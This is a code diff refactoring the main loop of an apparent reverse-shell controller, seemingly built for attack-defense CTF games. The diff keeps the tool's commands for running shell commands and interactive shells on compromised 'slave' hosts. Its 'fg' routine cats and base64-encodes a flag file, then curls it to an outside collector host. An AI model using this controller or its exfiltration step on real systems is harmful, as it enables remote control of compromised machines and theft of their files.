@@ -210,7 +210,8 @@ def main():
     show_commands()
     position = slaves[slaves.keys()[0]].node_hash  # master himself
     while True:
-        context_hint = "[%s] >> " % (slaves[position].hostname)
+        current_slave = slaves[position]
+        context_hint = "[%s:%d] >> " % (current_slave.hostname, current_slave.port)
         Log.context(context_hint)
         command = raw_input() or "h"
         if command.startswith("#"):
@@ -224,7 +225,7 @@ def main():
                 slaves[key].show_info()
             print "[%s]" % ("-" * 0x2A)
         elif command == "p":
-            slaves[position].show_info()
+            current_slave.show_info()
         elif command == "c":
             command = raw_input("Input command (uname -r) : ") or ("uname -r")
             Log.info("Command : %s" % (command))
@@ -278,7 +279,6 @@ def main():
                     position = slaves.keys()[0]
                     Log.info("Position changed to : %s" % (position))
         elif command == "fg":
-            slave = slaves[position]
             flag_path = raw_input(
                 "Input flag path (/flag.txt) : ") or ("/flag.txt")
             box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
@@ -286,11 +286,11 @@ def main():
             box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
             command = "FLAG=`cat %s | base64`" % (flag_path)
             Log.info("Command : %s" % (command))
-            result = slave.send_command(command)
+            result = current_slave.send_command(command)
             command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
                 box_host, box_port)
             Log.info("Command : %s" % (command))
-            result = slave.send_command(command)
+            result = current_slave.send_command(command)
             if result:
                 Log.info("Flag is sent to you!")
             else:
@@ -299,8 +299,7 @@ def main():
                 position = slaves.keys()[0]
                 Log.info("Position changed to : %s" % (position))
         elif command == "i":
-            slave = slaves[position]
-            slave.interactive_shell()
+            current_slave.interactive_shell()
         elif command == "q" or command == "quit" or command == "exit":
             EXIT_FLAG = True
             # TODO : release all resources before closing
@@ -317,8 +316,7 @@ def main():
             if EXEC_LOCAL:
                 os.system(command)
             else:
-                slave = slaves[position]
-                slave.send_command_print(command)
+                current_slave.send_command_print(command)
 
 
 if __name__ == "__main__":
